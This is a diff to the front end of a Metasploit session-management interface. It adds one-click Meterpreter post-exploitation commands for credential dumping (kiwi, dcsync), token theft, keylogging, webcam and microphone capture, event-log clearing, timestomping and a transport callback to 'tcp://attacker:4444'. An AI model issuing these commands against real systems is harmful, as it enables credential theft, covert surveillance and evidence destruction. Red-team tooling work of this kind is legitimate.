@@ -95,7 +95,7 @@ const ACTIONS: ActionItem[] = [
 // ── Quick command buttons ──
 // sessionType: 'meterpreter' | 'shell' | 'any'
 // platform:    'any' | 'linux' | 'windows'
-interface PostExCmd { label: string; cmd: string; searchInput?: boolean }
+interface PostExCmd { label: string; cmd: string; searchInput?: boolean; placeholder?: string }
 interface PostExGroup {
   label: string;
   sessionType: 'meterpreter' | 'shell' | 'any';
@@ -177,6 +177,136 @@ const POST_EX_QUICK: PostExGroup[] = [
       { label: 'lsa_secrets',  cmd: 'run post/windows/gather/lsa_secrets' },
       { label: 'cached creds', cmd: 'run post/windows/gather/cachedump' },
       { label: 'enum tokens',  cmd: 'run post/windows/gather/enum_tokens' },
+    ],
+  },
+  // ── Meterpreter / any OS — new groups ──
+  {
+    label: 'Process', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'migrate',    cmd: 'migrate',    searchInput: true, placeholder: 'PID' },
+      { label: 'execute',    cmd: 'execute -f', searchInput: true, placeholder: 'cmd.exe or /bin/bash' },
+      { label: 'kill',       cmd: 'kill',       searchInput: true, placeholder: 'PID' },
+      { label: 'shell',      cmd: 'shell' },
+    ],
+  },
+  {
+    label: 'File Ops', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'cat',      cmd: 'cat',    searchInput: true, placeholder: 'path/to/file' },
+      { label: 'cd',       cmd: 'cd',     searchInput: true, placeholder: 'path/to/dir' },
+      { label: 'mkdir',    cmd: 'mkdir',  searchInput: true, placeholder: 'new/dir' },
+      { label: 'rm',       cmd: 'rm',     searchInput: true, placeholder: 'path/to/file' },
+      { label: 'edit',     cmd: 'edit',   searchInput: true, placeholder: 'path/to/file' },
+    ],
+  },
+  {
+    label: 'File Transfer', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'download',   cmd: 'download',    searchInput: true, placeholder: 'C:\\path\\file or /remote/path' },
+      { label: 'upload',     cmd: 'upload',      searchInput: true, placeholder: '/local/path /remote/path' },
+    ],
+  },
+  {
+    label: 'Port Forward', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'portfwd add',    cmd: 'portfwd add',    searchInput: true, placeholder: '-l 4444 -p 3389 -r 192.168.1.10' },
+      { label: 'portfwd delete', cmd: 'portfwd delete', searchInput: true, placeholder: '-l 4444' },
+      { label: 'portfwd flush',  cmd: 'portfwd flush' },
+    ],
+  },
+  {
+    label: 'Transport', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'list',   cmd: 'transport list' },
+      { label: 'next',   cmd: 'transport next' },
+      { label: 'prev',   cmd: 'transport prev' },
+      { label: 'add',    cmd: 'transport add',    searchInput: true, placeholder: 'tcp://attacker:4444' },
+      { label: 'remove', cmd: 'transport remove', searchInput: true, placeholder: 'URL to remove' },
+    ],
+  },
+  {
+    label: 'Stealth', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'get_timeouts',  cmd: 'get_timeouts' },
+      { label: 'sleep',         cmd: 'sleep',         searchInput: true, placeholder: 'seconds' },
+      { label: 'set_timeouts',  cmd: 'set_timeouts',  searchInput: true, placeholder: '-c 60 -t 3600 -w 10' },
+    ],
+  },
+  {
+    label: 'Load Extension', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'kiwi',       cmd: 'load kiwi' },
+      { label: 'incognito',  cmd: 'load incognito' },
+      { label: 'python',     cmd: 'load python' },
+      { label: 'powershell', cmd: 'load powershell' },
+      { label: 'espia',      cmd: 'load espia' },
+    ],
+  },
+  {
+    label: 'Python', sessionType: 'meterpreter', platform: 'any',
+    commands: [
+      { label: 'python_execute', cmd: 'python_execute', searchInput: true, placeholder: '"import os; print(os.getcwd())"' },
+      { label: 'python_import',  cmd: 'python_import',  searchInput: true, placeholder: '/path/to/script.py' },
+      { label: 'python_reset',   cmd: 'python_reset' },
+    ],
+  },
+  // ── Meterpreter / Windows — new groups ──
+  {
+    label: 'Kiwi', sessionType: 'meterpreter', platform: 'windows',
+    commands: [
+      { label: 'creds_all',        cmd: 'creds_all' },
+      { label: 'lsa_dump_sam',     cmd: 'lsa_dump_sam' },
+      { label: 'lsa_dump_secrets', cmd: 'lsa_dump_secrets' },
+      { label: 'dcsync',           cmd: 'dcsync',    searchInput: true, placeholder: 'DOMAIN\\username' },
+      { label: 'wifi_list',        cmd: 'wifi_list' },
+    ],
+  },
+  {
+    label: 'Incognito', sessionType: 'meterpreter', platform: 'windows',
+    commands: [
+      { label: 'list_tokens -u',    cmd: 'list_tokens -u' },
+      { label: 'list_tokens -g',    cmd: 'list_tokens -g' },
+      { label: 'impersonate_token', cmd: 'impersonate_token', searchInput: true, placeholder: '"DOMAIN\\\\User"' },
+      { label: 'steal_token',       cmd: 'steal_token',       searchInput: true, placeholder: 'PID' },
+      { label: 'rev2self',          cmd: 'rev2self' },
+      { label: 'drop_token',        cmd: 'drop_token' },
+    ],
+  },
+  {
+    label: 'Keylogger', sessionType: 'meterpreter', platform: 'windows',
+    commands: [
+      { label: 'keyscan_start', cmd: 'keyscan_start' },
+      { label: 'keyscan_stop',  cmd: 'keyscan_stop' },
+      { label: 'keyscan_dump',  cmd: 'keyscan_dump' },
+    ],
+  },
+  {
+    label: 'Surveillance', sessionType: 'meterpreter', platform: 'windows',
+    commands: [
+      { label: 'screenshot',   cmd: 'screenshot' },
+      { label: 'webcam_list',  cmd: 'webcam_list' },
+      { label: 'webcam_snap',  cmd: 'webcam_snap' },
+      { label: 'record_mic',   cmd: 'record_mic -d', searchInput: true, placeholder: '30 (seconds)' },
+      { label: 'enumdesktops', cmd: 'enumdesktops' },
+      { label: 'getdesktop',   cmd: 'getdesktop' },
+    ],
+  },
+  {
+    label: 'Timestomp', sessionType: 'meterpreter', platform: 'windows',
+    commands: [
+      { label: 'clearev',    cmd: 'clearev' },
+      { label: 'timestomp',  cmd: 'timestomp', searchInput: true, placeholder: 'C:\\path\\file -r' },
+    ],
+  },
+  {
+    label: 'Registry', sessionType: 'meterpreter', platform: 'windows',
+    commands: [
+      { label: 'enumkey',   cmd: 'reg enumkey -k',   searchInput: true, placeholder: 'HKLM\\Software' },
+      { label: 'queryval',  cmd: 'reg queryval -k',  searchInput: true, placeholder: 'HKLM\\...\\key -v name' },
+      { label: 'setval',    cmd: 'reg setval -k',    searchInput: true, placeholder: 'HKLM\\...\\key -v name -d data' },
+      { label: 'createkey', cmd: 'reg createkey -k', searchInput: true, placeholder: 'HKLM\\...\\newkey' },
+      { label: 'deleteval', cmd: 'reg deleteval -k', searchInput: true, placeholder: 'HKLM\\...\\key -v name' },
+      { label: 'deletekey', cmd: 'reg deletekey -k', searchInput: true, placeholder: 'HKLM\\...\\key' },
     ],
   },
   // ── Shell / any OS ──
@@ -3332,7 +3462,8 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
         </aside>
 
         <main className="sd-main">
-          <div className={`sd-console-wrap${consoleCollapsed || activeAction === 8 || activeAction === 12 || activeAction === 10 || activeAction === 11 || activeAction === 13 || activeAction === 14 || activeAction === 15 ? ' sd-panel-collapsed' : ''}`}>
+          {activeAction !== 8 && activeAction !== 3 && activeAction !== 10 && activeAction !== 11 && activeAction !== 12 && activeAction !== 13 && activeAction !== 14 && activeAction !== 15 && (
+          <div className={`sd-console-wrap${consoleCollapsed ? ' sd-panel-collapsed' : ''}`}>
             <div className="sd-console-toggle-bar">
               <span className="sd-console-toggle-label">MSF Console</span>
               <button className="btn-panel-toggle" title={consoleCollapsed ? 'Expand console' : 'Collapse console'}
@@ -3346,6 +3477,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
                 : <div className="sd-no-session">Invalid session ID</div>
             )}
           </div>
+          )}
 
           {/* ── Vuln scan panel ── */}
           {activeAction === 1 && (
@@ -3826,7 +3958,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
                               <input
                                 className="post-ex-search-input"
                                 type="text"
-                                placeholder="pattern, e.g. *.txt"
+                                placeholder={c.placeholder ?? 'pattern, e.g. *.txt'}
                                 value={postExSearch}
                                 onChange={e => setPostExSearch(e.target.value)}
                                 onKeyDown={e => {
